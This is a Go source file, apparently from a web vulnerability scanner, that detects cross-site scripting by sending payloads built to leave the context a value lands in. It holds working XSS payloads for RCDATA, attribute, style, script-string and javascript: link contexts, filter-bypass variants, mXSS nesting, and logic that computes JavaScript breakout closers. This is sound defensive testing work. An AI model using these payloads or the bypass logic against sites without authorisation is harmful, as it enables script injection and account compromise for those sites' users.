// Context escapes: the payloads upstream sends to *leave* the context a value
// landed in.
//
// # Why this is a separate module and not more rows in `detect_xss.go`
//
// The existing detector classifies where a reflection landed and fires one
// payload per context. That covers the three common answers — a tag in the body,
// an attribute value, a string inside a `<script>`. It does not cover the cases
// where a value lands somewhere the payload table has nothing for:
//
//   - RCDATA (`<title>`, `<textarea>`): `XSS.Scan` deliberately *skips* escalation
//     here, because a tag written into character data is displayed rather than
//     run. XSSTRON's answer is to close the RCDATA element first
//     (`--></textarea></title></style>…`) and only then write the tag, and that
//     answer is missing from our table entirely.
//   - An attribute with no quotes around its value: `" onmouseover=… x="` cannot
//     escape `attr=VALUE`, because the application's own quote is not the one
//     terminating the value. XSSTRON sends `x id=clx onclick=…//` and lets the
//     unquoted value end at the space.
//   - A `javascript:` URI in a link: no tag with an event handler is built at
//     all, so a confirmation that looks for one cannot see it.
//   - Filters that drop the obvious spelling. Dalfox keeps a whole payload
//     family for this (`waf/bypass`), and xsser keeps its own; the shapes that
//     matter are a separator that is not a space and a tag nesting that survives
//     a regex looking for `<script`.
//
// # Why the confirmation is positional here too, and not "the payload is in the
// body"
//
// Three of the four families are confirmed by `confirmExecutable`, which the
// existing detector already requires to find the payload **inside a tag the
// application emitted**. That is the difference between "the page echoed my
// string" and "the page built an element from my string".
//
// The `javascript:` URI family cannot use it — there is no event handler in
// `<a href="javascript:…">`. It gets its own rule instead: the value has to
// appear raw, in text position (not inside a tag, not inside a comment), and
// inside an attribute assignment to `href`/`src`/`action`/`formaction`/`xlink:href`
// whose value begins `javascript:`. A payload echoed into an attribute of the
// page's own markup would not satisfy it, because the position check rejects it.
//
// The JavaScript-string family gets the strictest rule of the three, and the
// reason is worth stating because the naive version of it is a false-positive
// machine: the payload must contain **the same quote character the application
// used to delimit the string**. A value inside `var x = 'VALUE'` closed by a
// double quote is not an injection — the `//` in `"-proof//` simply comments
// out the rest of the line and nothing executes — yet the payload still appears
// verbatim in the response, so a "did my text come back" check reports a
// critical finding on every page that escapes nothing.
//
// # What is deliberately not here
//
// XSSTRON also probes the URL *fragment* (`#payload`). A fragment is never sent
// to the server, so there is nothing to request and nothing to observe; it is a
// browser-side surface. The registry says so in one row rather than leaving the
// absence to be noticed later.
package active

import (
	"context"
	"regexp"
	"strings"
)

// xsseProof is the statement an escaping payload carries.
//
// It is a statement rather than `alert(1)` for the reason the rest of the
// package uses: a scanner that makes the operator's browser pop dialogs is a
// scanner that gets uninstalled. It must also be valid in *expression*
// position, because two of the payloads below put it after a `-` operator.
const xsseProof = "document.title='rrxe'"

// xsseRCdataEscapes leave a character-data context.
//
// The order of the closing tags is XSSTRON's (`noscript`, `title`, `textarea`,
// `style`, `template`, `noembed`) and it is kept because the point is to be
// exhaustive rather than minimal: a parser ignores a close tag whose element is
// not open, so listing all six costs one request and cannot misfire.
var xsseRCdataEscapes = []struct {
	name    string
	payload string
}{
	{"rcdata close chain", `--></noscript></title></textarea></style></template></noembed>` +
		`<img src=x onerror=` + xsseProof + `>`},
}

// xsseAttributeEscapes leave an unquoted or single-quoted attribute value.
//
// The existing detector's attribute payloads all begin with a double quote,
// which only helps when the application's own value is double-quoted. These are
// the three shapes XSSTRON sends, and the middle one closes a single-quoted
// value by opening a *new* double-quoted attribute inside it.
var xsseAttributeEscapes = []struct {
	name    string
	payload string
}{
	{"unquoted attribute value", `x id=clx onclick=` + xsseProof + `// `},
	{"single-quoted attribute value", `' id="clx" onclick="` + xsseProof + `//"" '`},
	{"double-quoted attribute value", `" id=clx onclick=` + xsseProof + `// "`},
}

// xsseMarkupEscapes are the body-context shapes that survive a naive filter.
//
// Dalfox's bypass family and xsser's blacklist handling both exist because a
// filter is written against one spelling. The forms here are the three that
// differ structurally rather than cosmetically: a slash where a space is
// expected, a control character where a space is expected, and a nesting that
// turns a sanitizer's own output back into a tag.
var xsseMarkupEscapes = []struct {
	name    string
	payload string
}{
	{"slash tag separator", `<svg/onload=` + xsseProof + `>`},
	{"form feed attribute separator", "<img src=x onerror\x0c=" + xsseProof + ">"},
	{"nested markup (mxss shape)", `<math><mtext><table><mglyph><style><img src=x onerror=` + xsseProof + `>`},
}

// xsseLinkPayload is the `javascript:` URI shape.
//
// It is separated from `xsseMarkupEscapes` because it is confirmed by a
// different rule and because it needs a click — the finding says so.
func xsseLinkPayload(canary string) string {
	return `javascript:/*` + canary + `*/`
}

// xsseStyleAttributeEscapes leave a `style` attribute.
//
// The application's own quote ends the attribute, so the payload has to end it
// and add a handler to the tag it left behind. It is not the same rule as the
// element case below, which is why the two are separate tables with separate
// confirmations.
var xsseStyleAttributeEscapes = []struct {
	name    string
	payload string
}{
	{"double-quoted style attribute", `" onmouseover=` + xsseProof + ` x="`},
	{"single-quoted style attribute", `' onmouseover=` + xsseProof + ` x='`},
	{"unquoted style attribute", `x onmouseover=` + xsseProof + `// `},
}

// xsseStyleElementEscapes leave a `<style>` element.
//
// A `<style>` block is raw text: the browser reads everything up to `</style>` as
// a declaration list, so a tag written there is text. The payload has to close
// the element before the tag, and the confirmation refuses a payload that did
// not.
var xsseStyleElementEscapes = []struct {
	name    string
	payload string
}{
	// The two shapes Dalfox's `CSS_PLAIN_TEMPLATES` carries, with `onload` chosen
	// over `onerror` because a filter that blocks one handler word rarely blocks
	// the other, and two shapes only reach a filter that blocks both.
	{"style element raw text", `</style><svg onload=` + xsseProof + `>`},
	{"style element raw text (declaration)", `}</style><svg onload=` + xsseProof + `>`},
	{"style element raw text (img)", `</style><img src=x onerror=` + xsseProof + `>`},
	// `CSS_SQ_TEMPLATES` / `CSS_DQ_TEMPLATES`: a value inside a *quoted* CSS
	// string has to leave that string before it can close the element. Without
	// the leading `');}` or `");}` the payload closes the element while the string
	// is still open, so the closing tag becomes part of the string.
	{"style element raw text (single-quoted value)", `');}</style><svg onload=` + xsseProof + `>`},
	{"style element raw text (double-quoted value)", `");}</style><svg onload=` + xsseProof + `>`},
}

// xsseURIAttributes are the attributes whose value a browser will navigate.
var xsseURIAttributes = map[string]bool{
	"href": true, "src": true, "action": true, "formaction": true, "xlink:href": true,
}

// xsseJavascriptAssign matches a navigable attribute assignment, up to and
// including its optional opening quote.
//
// The scheme is deliberately *not* part of this expression. The payload itself
// starts with `javascript:`, so a rule that looked for the scheme before the
// payload could never match anything — the proof is the gap rule in
// `javascriptURIAssigns`: the page wrote the assignment, and the payload begins
// exactly where that assignment's value begins.
var xsseJavascriptAssign = regexp.MustCompile(
	`(?i)(?:href|src|action|formaction|xlink:href)\s*=\s*["']?`)

// nonExecutableScriptTypes are script types whose content is data, not code.
//
// `<script type="application/ld+json">` is the common one, and reflecting into
// it is not a scripting problem at all: a browser parses it as JSON and never
// executes anything. Treating it as a script context is how a scanner reports a
// critical finding on a page whose only script block holds a schema.org block.
var nonExecutableScriptTypes = []string{"json", "template", "ld+json", "importmap"}

// XSSEscape is the context-escape detector: it fires when a value reaches a
// context and a payload shaped for *leaving that context* produced executable
// structure.
type XSSEscape struct{}

// Name implements Module.
func (XSSEscape) Name() string { return "xss-escape" }

// Level implements Module.
func (XSSEscape) Level() Level { return LevelParam }

// Scan probes one surface.
func (m XSSEscape) Scan(ctx context.Context, t *Transport, p Point, baseline *Response) []Finding {
	canary := newCanary("rre")
	if canary == "" {
		return nil
	}
	reflected, err := t.Fire(ctx, p, p.Param, canary, false, nil)
	if err != nil || !Fresh(baseline, reflected, canary) {
		return nil
	}
	if !isHTMLContentType(reflected) {
		// Nothing in a JSON document is markup, so there is no context to leave.
		return nil
	}
	body := reflected.Body
	index := strings.Index(body, canary)
	context := classifyContext(body, canary)
	// `insideOpenTag` is asked separately from `attributeAt` because the two
	// answer different questions. A value inside `<p>text href="…"` is *after* a
	// tag, and reading the nearest `<` would hand the attribute parser a `<p>`
	// whose `>` it has to notice; the tag check is what decides which branch runs.
	inTag := insideOpenTag(body, index)
	attrName := ""
	if inTag {
		_, attrName, _, _ = attributeAt(body, index)
	}

	switch {
	case context == "script-string":
		return jsStringEscapes(ctx, t, p, body, canary, probeFilter(ctx, t, p, reflected))
	case inStyleContext(body, index):
		filter := probeFilter(ctx, t, p, reflected)
		if insideOpenTag(body, index) {
			return styleAttributeEscapes(ctx, t, p, baseline, filter)
		}
		return markupEscapes(ctx, t, p, baseline, cssContext, xsseStyleElementEscapes, filter)
	case context == rcdataContext:
		return markupEscapes(ctx, t, p, baseline, "rcdata", xsseRCdataEscapes, probeFilter(ctx, t, p, reflected))
	case inTag:
		return attributeEscapes(ctx, t, p, baseline, body, canary, attrName, probeFilter(ctx, t, p, reflected))
	default:
		return markupEscapes(ctx, t, p, baseline, context, xsseMarkupEscapes, probeFilter(ctx, t, p, reflected))
	}
}

// xsseProbeChars is the set whose survival decides whether any payload can work.
//
// It is Dalfox's `SPECIAL_PROBE_CHARS`, and the list is the whole argument of the
// probe: `(` and `[` matter only to a closer, `<` and `>` only to markup, `'` and
// `"` to a string break, `\` to an escaped quote, `|` to an event handler without
// `=`. A target that drops one of them invalidates every payload that needs it.
var xsseProbeChars = []rune{
	'/', '\\', '\'', '{', '`', '<', '>', '"', '(', ')', ';',
	'=', '|', '}', '[', '.', ':', ']', '+', ',', '$', '-',
}

// xsseFilter is what one request learned about the target's filtering.
//
// It is per payload, not per surface: `<` being dropped does not make the
// `javascript:` URI payload impossible, because that payload contains no `<`. A
// profile that switched whole surfaces off would lose the finding that survives
// the filter, and losing it is the failure mode this exists to avoid.
type xsseFilter struct {
	invalid map[rune]bool
}

// allowsString reports whether every character of s survived.
//
// Characters outside the probed set — letters, digits, space — are never probed
// and count as usable: tag and handler names are alphabetic, so a target that
// filtered letters would not be serving HTML at all.
func (f xsseFilter) allowsString(s string) bool {
	if f.invalid == nil {
		return true
	}
	for _, c := range s {
		if f.invalid[c] {
			return false
		}
	}
	return true
}

// probeFilter asks what survived, in one request.
//
// The whole set goes out between two markers in a single value, and the answer is
// read back from between those markers. One request, not one per character:
// Dalfox batches the same way (`active_probe_param`), and a per-character loop
// would spend 22 requests on a surface to learn what the single one already says.
//
// A character that comes back HTML-escaped counts as dropped, and that is a
// deliberate difference from the upstream heuristic. Upstream's own note lists
// "detect normalization and still treat as valid" as unfinished, which is the
// wrong direction for this question: a `<` the application turned into `&lt;`
// cannot open a tag, so a payload containing it cannot execute. Treating it as
// usable would send the payload and learn the same thing from the confirmation
// that the probe already answered.
func probeFilter(ctx context.Context, t *Transport, p Point, reflected *Response) xsseFilter {
	open := newCanary("rro")
	closeAt := newCanary("rrc")
	if open == "" || closeAt == "" || ctx.Err() != nil {
		return xsseFilter{}
	}
	batched := string(xsseProbeChars)
	probe := open + batched + closeAt
	resp, err := t.Fire(ctx, p, p.Param, probe, false, nil)
	// Freshness is decided by the two markers, not by the payload string, and the
	// distinction is the whole point of the probe. A target that filters one of the
	// special characters answers with a body that does *not* contain what was sent —
	// which is exactly the answer the probe went out to get. Asking `Fresh` for the
	// full payload therefore reports "the target did not reflect this" on precisely
	// the targets whose filtering is worth knowing, and the profile comes back empty.
	// The markers are alphanumeric, so no filter that drops special characters
	// touches them.
	if err != nil || !probeReflected(reflected, resp, open, closeAt) {
		return xsseFilter{}
	}
	segment := betweenMarkers(resp.Body, open, closeAt)
	if segment == "" {
		return xsseFilter{}
	}
	invalid := make(map[rune]bool)
	for _, c := range xsseProbeChars {
		if !segmentContains(segment, c) {
			invalid[c] = true
		}
	}
	return xsseFilter{invalid: invalid}
}

// probeReflected reports whether both markers came back in this response and not
// in the baseline.
func probeReflected(baseline, injected *Response, open, closeAt string) bool {
	if injected == nil || !strings.Contains(injected.Body, open) || !strings.Contains(injected.Body, closeAt) {
		return false
	}
	return baseline == nil || !strings.Contains(baseline.Body, open)
}

// segmentContains reports whether the reflected segment carries c literally.
//
// An escaped form does not count, and that is the whole question the probe asks.
// A `<` the application turned into `&lt;` cannot open a tag, so a payload
// containing it cannot execute; counting the escaped form as the character would
// send every payload the target has already made harmless, and the confirmation
// would then fail for each one — spending requests to learn what the probe already
// answered. It is a deliberate difference from upstream, whose own note lists
// normalisation detection as unfinished.
func segmentContains(segment string, c rune) bool {
	return strings.ContainsRune(segment, c)
}

// betweenMarkers returns the text between the first open marker and the first
// close marker after it, or the empty string when either is missing.
func betweenMarkers(body, open, closeAt string) string {
	start := strings.Index(body, open)
	if start < 0 {
		return ""
	}
	start += len(open)
	end := strings.Index(body[start:], closeAt)
	if end < 0 {
		return ""
	}
	return body[start : start+end]
}

// cssContext names the context a style value landed in.
const cssContext = "css"

// inStyleContext reports whether the reflection sits inside a `style` attribute
// or inside a `<style>` element.
//
// Both are CSS, and neither is markup: the browser parses the value as a
// declaration list, so a tag written there is text. That is why the escape has to
// leave the CSS first — the attribute case ends the attribute, the element case
// closes the element.
func inStyleContext(body string, index int) bool {
	if index <= 0 || index > len(body) {
		return false
	}
	if insideOpenTag(body, index) {
		_, attrName, _, ok := attributeAt(body, index)
		return ok && attrName == "style"
	}
	return hasUnclosedStyle(body, index)
}

// styleAttributeEscapes handles a value inside a `style` attribute.
//
// The confirmation is the attribute one: the application already wrote the tag,
// and the payload's job is to hand that tag an event handler. The element rule
// would look for a tag the payload built and find none, which is the wrong
// question for this context.
func styleAttributeEscapes(ctx context.Context, t *Transport, p Point, baseline *Response,
	filter xsseFilter) []Finding {
	for _, candidate := range xsseStyleAttributeEscapes {
		if ctx.Err() != nil {
			return nil
		}
		if !filter.allowsString(candidate.payload) {
			continue
		}
		resp, err := t.Fire(ctx, p, p.Param, candidate.payload, false, nil)
		if err != nil || !Fresh(baseline, resp, candidate.payload) {
			continue
		}
		if !confirmHandlerInjectedIntoTag(resp.Body, candidate.payload) {
			continue
		}
		finding, _ := NewFinding(Spec{
			Module:   "xss-escape",
			Title:    "Context escape (style attribute, " + candidate.name + ", executable markup confirmed)",
			Claimed:  SeverityHigh,
			Tier:     TierVerified,
			Point:    p,
			Payload:  candidate.payload,
			Evidence: Snippet(resp.Body, candidate.payload, xssTagWindow),
			Description: "The parameter value is written into a style attribute without encoding. A payload that " +
				"ended the attribute and added an event handler to the same tag produced markup the " +
				"application's own response carries, so the handler runs in the application's origin.",
			Remediation: "Do not build a style attribute by concatenating request data, and do not put " +
				"request data into an event handler. Deploy a Content-Security-Policy without 'unsafe-inline'.",
		})
		return []Finding{finding}
	}
	return nil
}

// hasUnclosedStyle reports whether a `<style>` element is open at index.
//
// `textarea` and `xmp` are raw text too, but a browser *shows* their content
// rather than parsing it as CSS, so treating a `<textarea>` as a style sheet would
// report a `<style>` escape on a page that has no style sheet at all.
func hasUnclosedStyle(body string, index int) bool {
	prefix := strings.ToLower(body[:index])
	open := strings.LastIndex(prefix, "<style")
	closing := strings.LastIndex(prefix, "</style")
	return open >= 0 && open > closing
}

// insideOpenTag reports whether body[index] lies between a `<` and the `>` that
// closes that tag.
//
// The check that matters is the second half. A paragraph that merely *mentions*
// `<a href="javascript:…"` in its text has a `<` before it and no `>` after it,
// so a test that only looks backwards decides it is inside a tag and then fires
// payloads at text.
func insideOpenTag(body string, index int) bool {
	if index <= 0 || index > len(body) {
		return false
	}
	open := strings.LastIndex(body[:index], "<")
	if open < 0 {
		return false
	}
	return !strings.Contains(body[open:index], ">")
}

// jsStringEscapes fires a payload that terminates the JavaScript string the
// value landed in.
//
// The delimiter decides the payload, and that is the whole point of the
// function. See the file header: a payload quoted with the wrong character
// appears verbatim in the response while executing nothing.
// jsEscapeEntry is one closer the detector may try, with the name the finding
// will carry and the rule that confirms it.
//
// The kind is not bookkeeping: the two mechanisms are confirmed by different
// questions. A statement payload is confirmed by the parser's own position — the
// value has to end the construct it sits in. An element-close payload is confirmed
// by the markup that follows the close, because after `</script>` the browser is no
// longer reading JavaScript at all and a JS statement written there is page text.
type jsEscapeEntry struct {
	name    string
	payload string
	markup  bool
}

// jsEscapeCatalog is the ordered list of closers a JavaScript-context reflection
// is tried against: the one computed from the page's own script first, then the
// shapes the detector knows how to build.
//
// The catalogue after the computed closer exists because a computed closer can
// be *wrong* rather than missing, and the difference decides whether the finding
// survives. `jsBreakoutPlan` does not model every construct a page can ship, so
// on a prefix it misreads it answers with a closer that leaves the parser inside
// something — and a payload that comes back in the response and runs nothing looks
// exactly like a safe page. A fixed catalogue is what turns that "no finding"
// into a finding, at the cost of extra requests only on the pages that would
// otherwise have produced nothing.
func jsEscapeCatalog(closer, name, delimiter string, filter xsseFilter) []jsEscapeEntry {
	entries := make([]jsEscapeEntry, 0, 6)
	add := func(entryName, entryCloser string) {
		// The `;` is not punctuation: without it a closer that ends a *call* or a
		// literal produces `render({label: ''})document.title=…`, which no browser
		// parses — the reflection comes back and executes nothing while the row
		// claims otherwise. The statement separator is what makes "reaches
		// executable position" true of the payload and not only of the response.
		payload := entryCloser + ";" + xsseProof + "//"
		if !filter.allowsString(payload) {
			return
		}
		for _, existing := range entries {
			if existing.payload == payload {
				return
			}
		}
		entries = append(entries, jsEscapeEntry{name: entryName, payload: payload})
	}
	addMarkup := func(entryName, payload string) {
		if !filter.allowsString(payload) {
			return
		}
		for _, existing := range entries {
			if existing.payload == payload {
				return
			}
		}
		entries = append(entries, jsEscapeEntry{name: entryName, payload: payload, markup: true})
	}
	// The computed closer first, and by its own name: a script the scanner read
	// correctly is the common case, and the rows after it exist for the ones it
	// cannot.
	if closer != "" {
		add(name, closer)
	}
	// The delimiter alone, under its own name rather than as a second copy of the
	// computed closer. When the two are the same string the payload is the same and
	// the duplicate check drops the entry; when they differ the weaker one still
	// gets tried, because a page whose script the scanner could not read has a real
	// finding waiting behind it.
	if delimiter != "" && delimiter != closer {
		add("string delimiter", delimiter)
	}
	// Escaped quotes. When the page escapes `"` as `\"`, a payload that opens with
	// a backslash turns the application's own escape into `\\"` — a literal
	// backslash and a real closing quote. This is the one case where adding a
	// character defeats the escaping rather than the reverse, and it only makes
	// sense when the closer is itself a quote: a leading backslash in front of a
	// bracket would be a syntax error, not an escape.
	if (delimiter == "'" || delimiter == `"`) && strings.HasPrefix(closer, delimiter) {
		add("escaped "+name, `\`+closer)
		add("escaped string delimiter", `\`+delimiter)
	}
	// Leave the script element entirely. The value is inside `<script>`, so
	// closing the element puts the payload in text position and the tag after it
	// is parsed as markup — a mechanism that does not depend on reading the
	// script's syntax at all, which is why it is tried last and not first.
	//
	// It has to carry an element, not a statement: after `</script>` the browser
	// reads text, and `</script>;alert(1)` is a sentence on a page. Dalfox's
	// `JS_RAW_TEMPLATES` carries the same shape for the same reason.
	addMarkup("script element close", `</script><svg onload=`+xsseProof+`>`)
	return entries
}

func jsStringEscapes(ctx context.Context, t *Transport, p Point, body, canary string,
	filter xsseFilter) []Finding {
	index := strings.Index(body, canary)
	closer, name := jsBreakoutPlan(body[:index])
	// An empty closer is the code position *and* the unreadable-prefix case; the
	// delimiter rule tells them apart and is deliberately weaker, closing only
	// the string.
	delimiter := jsStringDelimiter(body, canary)
	if closer == "" && delimiter != "" {
		closer, name = delimiter, "string delimiter"
	}
	if closer == "" {
		closer, name = "", "code position"
	}

	for _, entry := range jsEscapeCatalog(closer, name, delimiter, filter) {
		if ctx.Err() != nil {
			return nil
		}
		resp, err := t.Fire(ctx, p, p.Param, entry.payload, false, nil)
		if err != nil {
			continue
		}
		confirmed := confirmScriptBreak(resp.Body, entry.payload)
		if entry.markup {
			confirmed = confirmInjectedElement(resp.Body, entry.payload)
		}
		if !confirmed {
			continue
		}
		finding, _ := NewFinding(Spec{
			Module: "xss-escape",
			Title: "JavaScript injection in script context (" + entry.name +
				", " + map[bool]string{true: "element closed", false: "terminated"}[entry.markup] + ")",
			Claimed:  SeverityHigh,
			Tier:     TierVerified,
			Point:    p,
			Payload:  entry.payload,
			Evidence: Snippet(resp.Body, entry.payload, xssTagWindow),
			Description: "The parameter value reaches JavaScript inside a script element without encoding, and the " +
				"submitted value reaches executable position by " + entry.name + ", so the code after it is parsed " +
				"by the browser rather than read as text. The first closer is computed from the script's own text " +
				"before the reflection; the shapes after it are tried because a script the scanner cannot read " +
				"fully would otherwise turn a real finding into no finding.",
			Remediation: "Do not build a script by concatenating request data. Emit the value as JSON with the " +
				"framework's own serialiser, or render it as text content. A Content-Security-Policy without " +
				"'unsafe-inline' is the second line of defence, not the fix.",
		})
		return []Finding{finding}
	}
	return nil
}

// jsBreakoutPlan reads the JavaScript the application emitted before the
// reflection and names what has to be closed for the submitted value to become
// code.
//
// It is a character scanner, not a parser, and the states it models are the ones
// that swallow a closing quote: a single- or double-quoted string, a template
// literal (including a `${…}` substitution inside it), a line comment, a block
// comment, and unbalanced brackets. That is the same set Dalfox's
// `compute_js_breakout` models, and it exists because the naive payload fails on
// a value the application wrapped: `f('` needs `')` and not `'`, and
// `var o={k:'` needs `'}`. Sending the naive one closes the string, leaves the
// call or the object open, and the parser then swallows the statement that
// followed it — the payload comes back in the response and runs nothing.
//
// A regular-expression literal is deliberately not recognised, which is the
// upstream limitation reproduced rather than silently fixed: reading `/` as the
// start of a regex requires knowing whether the parser is in an operand position,
// and guessing wrong in that direction costs a payload rather than a finding.
func jsBreakoutPlan(prefix string) (closer, name string) {
	var (
		inSingle, inDouble, inTemplate bool
		inLineComment, inBlockComment  bool
		inRegex                        bool
		regexClass                     bool
		open                           []byte
		substituted                    bool
	)
	const maxDepth = 256
	for i := 0; i < len(prefix); i++ {
		c := prefix[i]
		switch {
		case inLineComment:
			if c == '\n' {
				inLineComment = false
			}
			continue
		case inBlockComment:
			if c == '*' && i+1 < len(prefix) && prefix[i+1] == '/' {
				inBlockComment = false
				i++
			}
			continue
		case inRegex:
			switch {
			case c == '\\':
				i++
			case c == '[':
				regexClass = true
			case c == ']':
				regexClass = false
			case c == '/' && !regexClass:
				inRegex = false
			case c == '\n':
				// A regex literal cannot span a line, so the parser was never in
				// one: resume in code and let the next character be read normally.
				inRegex = false
			}
			continue
		case inSingle || inDouble || inTemplate:
			if c == '\\' {
				i++
				continue
			}
			if inSingle && c == '\'' {
				inSingle = false
				continue
			}
			if inDouble && c == '"' {
				inDouble = false
				continue
			}
			if inTemplate {
				switch {
				case c == '`':
					inTemplate = false
				case c == '$' && i+1 < len(prefix) && prefix[i+1] == '{':
					// Inside a substitution the parser is in code again, and the
					// substitution's own `}` is one more thing to close.
					substituted = true
					inTemplate = false
					open = append(open, '}')
					i++
				}
			}
			continue
		}
		switch {
		case c == '/' && i+1 < len(prefix) && prefix[i+1] == '/':
			// Comments before the regex rule, always: `/*` and `//` share their
			// first character with a pattern, and reading `/* … ` as a pattern
			// loses the block comment that the value is sitting inside.
			inLineComment = true
			i++
		case c == '/' && i+1 < len(prefix) && prefix[i+1] == '*':
			inBlockComment = true
			i++
		case c == '/' && jsRegexStartsAt(prefix, i):
			// A `/` in operand position opens a regex literal, and everything up to
			// its closing `/` is not code. Reading it as division instead leaves a
			// quote-looking character inside the "code" region and hands back a
			// closer built on a stack that never balanced — a wrong closer, which
			// is worse than a missing one because it produces a payload that
			// reflects and executes nothing.
			if end, ok := jsRegexEnd(prefix, i); ok {
				// A complete literal is skipped whole and leaves no state behind:
				// the character after its closing `/` is code again.
				i = end
			} else {
				// An unterminated one is where the reflection may sit, and there the
				// scanner must stay inside the pattern to close it with `/`.
				inRegex = true
				i++
			}
		case c == '\'':
			inSingle = true
		case c == '"':
			inDouble = true
		case c == '`':
			inTemplate = true
		case c == '(' || c == '[' || c == '{':
			if len(open) < maxDepth {
				open = append(open, c)
			}
		case c == ')' || c == ']' || c == '}':
			if len(open) > 0 && closingOf(open[len(open)-1]) == c {
				open = open[:len(open)-1]
			}
		}
	}

	var closers strings.Builder
	switch {
	case inLineComment:
		// A line comment ends at the newline; nothing else closes it.
		return "\n", "a line comment"
	case inBlockComment:
		return "*/", "a block comment"
	case inRegex:
		// Inside `/…/` the only way out is the closing delimiter: the characters
		// around it are pattern text, and a statement written there is part of
		// the pattern until the literal ends.
		return "/", "a regex literal"
	}
	switch {
	case inSingle:
		closers.WriteByte('\'')
	case inDouble:
		closers.WriteByte('"')
	case inTemplate:
		closers.WriteByte('`')
	}
	for i := len(open) - 1; i >= 0; i-- {
		closers.WriteByte(closingOf(open[i]))
	}
	if substituted && !inTemplate {
		// The substitution's backtick is the last thing standing between the
		// statement and the rest of the template.
		closers.WriteByte('`')
	}
	text := closers.String()
	if text == "" {
		return "", "code position"
	}
	return text, jsBreakoutName(inSingle, inDouble, inTemplate, substituted, len(open))
}

// jsKeywordsBeforeRegex are the keywords after which a `/` opens a pattern rather
// than dividing. The list is Dalfox's `KEYWORDS_BEFORE_REGEX`.
var jsKeywordsBeforeRegex = map[string]bool{
	"return": true, "typeof": true, "case": true, "do": true, "else": true,
	"in": true, "of": true, "new": true, "delete": true, "void": true,
	"throw": true, "instanceof": true, "yield": true, "await": true,
}

// jsRegexStartsAt reports whether the `/` at index i opens a regex literal.
//
// It is decided by the previous significant character, which is the usual
// heuristic and the one upstream uses: after an operand (`x`, `1`, `)`, `]`) a `/`
// divides, after an operator or a keyword it opens a pattern. The failure mode is
// asymmetric on purpose — reading a division as a pattern swallows the rest of the
// line, while reading a pattern as division costs one wrong closer — and the
// catalogue that follows the computed closer is what covers that second case.
func jsRegexStartsAt(prefix string, i int) bool {
	j := i
	for j > 0 && isJSSpace(prefix[j-1]) {
		j--
	}
	if j == 0 {
		return true
	}
	prev := prefix[j-1]
	if isJSWordByte(prev) {
		end := j
		for j > 0 && isJSWordByte(prefix[j-1]) {
			j--
		}
		return jsKeywordsBeforeRegex[strings.ToLower(prefix[j:end])]
	}
	switch prev {
	case ')', ']', '\'', '"', '`', '.':
		return false
	}
	return true
}

// jsRegexEnd returns the index of the `/` that closes a literal opened at i, and
// whether one exists on the same line.
//
// Escapes and character classes are honoured, because `[/]` and `/\//` are
// ordinary patterns whose inner slash is not the end.
func jsRegexEnd(prefix string, i int) (int, bool) {
	inClass := false
	for j := i + 1; j < len(prefix); j++ {
		switch prefix[j] {
		case '\\':
			j++
		case '[':
			inClass = true
		case ']':
			inClass = false
		case '/':
			if !inClass {
				return j, true
			}
		case '\n':
			return 0, false
		}
	}
	return 0, false
}

func isJSSpace(b byte) bool {
	return b == ' ' || b == '\t' || b == '\n' || b == '\r'
}

func isJSWordByte(b byte) bool {
	return b == '_' || b == '$' ||
		(b >= 'a' && b <= 'z') || (b >= 'A' && b <= 'Z') || (b >= '0' && b <= '9')
}

// closingOf is the bracket that closes an opening one.
func closingOf(open byte) byte {
	switch open {
	case '(':
		return ')'
	case '[':
		return ']'
	case '{':
		return '}'
	}
	return open
}

// jsBreakoutName names the construct the closer belongs to, for the finding's
// title — a title that says only "closed" sends a reader looking for the bug.
//
// A value inside a `${…}` substitution is reported as the template literal it
// sits in rather than as a bare bracket: the reader's next question is which
// construct to look at in the source, and "unclosed bracket" sends them to the
// wrong line.
func jsBreakoutName(inSingle, inDouble, inTemplate, substituted bool, open int) string {
	switch {
	case inSingle:
		return "single-quoted string"
	case inDouble:
		return "double-quoted string"
	case inTemplate, substituted:
		return "template literal"
	case open > 0:
		return "unclosed bracket"
	}
	return "code position"
}

// markupEscapes fires payloads that build an executable element.
func markupEscapes(ctx context.Context, t *Transport, p Point, baseline *Response,
	context string, escapes []struct{ name, payload string }, filter xsseFilter) []Finding {
	for _, candidate := range escapes {
		if ctx.Err() != nil {
			return nil
		}
		if !filter.allowsString(candidate.payload) {
			continue
		}
		resp, err := t.Fire(ctx, p, p.Param, candidate.payload, false, nil)
		if err != nil || !Fresh(baseline, resp, candidate.payload) {
			continue
		}
		// Not `confirmExecutable`: that rule requires the payload to *start*
		// inside the element it built, which is exactly what a chain payload
		// cannot do — the chain begins by closing a `<textarea>`, and only its
		// tail is the element. The rule here is the honest one for this shape:
		// the payload came back verbatim, in text position, and it carries an
		// element with an event handler, so the application's own response now
		// contains markup a browser will run.
		if !confirmInjectedElement(resp.Body, candidate.payload) {
			continue
		}
		finding, _ := NewFinding(Spec{
			Module:   "xss-escape",
			Title:    "Context escape (" + context + ", " + candidate.name + ", executable markup confirmed)",
			Claimed:  SeverityHigh,
			Tier:     TierVerified,
			Point:    p,
			Payload:  candidate.payload,
			Evidence: Snippet(resp.Body, candidate.payload, xssTagWindow),
			Description: "The parameter value reaches a " + context + " context without encoding, and a payload " +
				"shaped for leaving that context produced an element the application's own response carries. " +
				"The element was built by the application from submitted input, so it executes in the " +
				"application's origin.",
			Remediation: "Encode output for the context it is written into, and deploy a Content-Security-Policy " +
				"without 'unsafe-inline'. Filters that remove a fixed spelling of a tag are not a control: this " +
				"payload differs from the filtered one only in its separators.",
		})
		return []Finding{finding}
	}
	// Nothing with an event handler fired. The link shape is still worth one
	// request, because an application that reflects a `javascript:` URI into a
	// link has a scripting problem whether or not a filter blocks the tag forms.
	return linkEscapes(ctx, t, p, baseline, filter)
}

// linkEscapes looks for a `javascript:` URI the application itself assembled.
func linkEscapes(ctx context.Context, t *Transport, p Point, baseline *Response, filter xsseFilter) []Finding {
	if ctx.Err() != nil {
		return nil
	}
	canary := newCanary("rre")
	if canary == "" {
		return nil
	}
	payload := xsseLinkPayload(canary)
	if !filter.allowsString(payload) {
		return nil
	}
	resp, err := t.Fire(ctx, p, p.Param, payload, false, nil)
	if err != nil || !Fresh(baseline, resp, payload) {
		return nil
	}
	if !javascriptURIAssigns(resp.Body, payload) {
		return nil
	}
	finding, _ := NewFinding(Spec{
		Module:   "xss-escape",
		Title:    "javascript: URI injected into a link or resource attribute",
		Claimed:  SeverityHigh,
		Tier:     TierVerified,
		Point:    p,
		Payload:  payload,
		Evidence: Snippet(resp.Body, payload, xssTagWindow),
		Description: "The submitted value was written into an attribute the browser navigates (href, src, " +
			"action, formaction or xlink:href) and that attribute now carries a javascript: URI. The script runs " +
			"in the application's origin when the link is followed — one click, or no click at all for a " +
			"form action or an image source.",
